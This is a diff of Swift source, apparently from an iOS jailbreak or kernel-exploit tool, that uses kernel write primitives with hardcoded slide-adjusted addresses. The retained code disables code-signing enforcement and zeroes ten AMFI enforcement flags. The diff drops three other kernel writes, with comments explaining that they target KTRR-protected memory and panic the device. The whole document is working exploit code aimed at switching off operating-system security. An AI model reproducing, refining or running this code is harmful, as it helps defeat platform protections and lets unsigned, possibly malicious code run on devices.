@@ -47,20 +47,17 @@ final class ExpTCLoadAndSpawn {
         // We need to replicate ALL those writes
         let slide = ds_get_kernel_slide()
         
-        // 1. cs_enforcement_disable = 1
+        // 1. cs_enforcement_disable = 1 (WRITABLE — confirmed on device!)
         let csDisableAddr = 0xfffffff00a160798 as UInt64 &+ slide
         ds_kwrite32(csDisableAddr, 1)
         log("cs_enforcement_disable → 1")
         
-        // 2. developer_mode_init = 1
-        let devModeAddr = 0xfffffff00a0e1368 as UInt64 &+ slide
-        ds_kwrite8(devModeAddr, 1)
-        log("developer_mode_init → 1")
-        
-        // 3. pmap_cs_enforcement = 1 (may fail if KTRR, but try)
-        let pmapEnfAddr = 0xfffffff00a0e45b8 as UInt64 &+ slide
-        ds_kwrite8(pmapEnfAddr, 1)
-        log("pmap_cs_enforcement → 1")
+        // NOTE: developer_mode_init (0xa0e1368) and pmap_cs_enforcement (0xa0e45b8)
+        // are in __DATA_CONST — KTRR protected. Writing causes PANIC!
+        // They are already 1 on device (confirmed by pmap_cs probe).
+        // DO NOT WRITE TO THEM.
+        log("developer_mode_init: already 1 (read-only, skip)")
+        log("pmap_cs_enforcement: already 1 (read-only, skip)")
         
         // 4. Zero AMFI __DATA enforcement flags (10 flags)
         let amfiBase: UInt64 = 0xfffffff00a330098 &+ slide
@@ -70,11 +67,10 @@ final class ExpTCLoadAndSpawn {
         }
         log("AMFI 10 flags zeroed")
         
-        // 5. trust_cache_load_gate = 1 (may fail if KTRR)
-        let tcGateAddr = 0xfffffff007b795e8 as UInt64 &+ slide
-        ds_kwrite8(tcGateAddr, 1)
-        let tcGateAfter = ds_kread8(tcGateAddr)
-        log("trust_cache_load_gate → \(tcGateAfter)")
+        // NOTE: trust_cache_load_gate (0xfffffff007b795e8) is in __DATA_CONST
+        // Writing to it causes KERNEL PANIC! Do NOT write.
+        // It's OK because device is unlocked → kernel bypasses this gate anyway.
+        log("trust_cache_load_gate: skipped (KTRR, causes panic)")
         
         log("")
         
